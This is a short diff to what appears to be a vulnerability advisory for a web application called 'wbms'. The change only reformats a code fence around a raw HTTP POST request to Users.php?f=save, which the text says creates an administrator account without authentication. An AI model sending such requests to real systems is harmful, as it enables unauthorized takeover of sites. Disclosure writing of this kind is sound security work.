@@ -20,7 +20,8 @@ Impact: Full System Compromise
 
 The following raw HTTP request demonstrates how an attacker can create an administrator account named administrator with the password administrator without any prior authentication:
 
-```POST /wbms/classes/Users.php?f=save HTTP/1.1
+```
+POST /wbms/classes/Users.php?f=save HTTP/1.1
 Host: localhost
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGJhiLy3gOi3KH7A3
 X-Requested-With: XMLHttpRequest
